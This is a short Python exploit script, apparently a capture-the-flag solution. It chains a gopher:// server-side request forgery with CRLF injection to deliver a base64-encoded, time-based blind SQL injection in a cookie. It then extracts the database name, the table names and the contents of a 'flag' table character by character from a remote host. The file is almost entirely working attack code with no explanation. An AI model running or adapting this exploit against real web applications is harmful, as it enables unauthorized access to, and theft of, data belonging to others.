import time
import base64
import requests
import urllib.parse

host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"
content_length = len(content)

payload =\
"""GET /index.php HTTP/1.1
Host: localhost:80
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: this_is_your_cookie"""

tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLF(换行)漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new+"="
result = urllib.parse.quote(result)# 对新增的部分继续编码

url="http://61.147.171.105:51577/use.php?url="
flag=""
for pos in range(1,50):
    for i in range(33,127):
        #poc="') union select 1,2,if(1=1,sleep(5),1) # "

        #security
        #poc="') union select 1,2,if(ascii(substr((database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "

        #flag
        #poc="') union select 1,2,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "

        poc="') union select 1,2,if(ascii(substr((select * from flag)," + str(pos) + ",1) )=" + str(i) + ",sleep(2),1) # "
        bs = str(base64.b64encode(poc.encode("utf-8")), "utf-8")
        final_poc = result+bs+"%3B%250d%250a"
        t1 = time.time()
        res = requests.get(url+final_poc)
        t2 = time.time()
        if(t2 - t1 > 2):
            flag += chr(i)
            print(flag)
            break
print(flag)

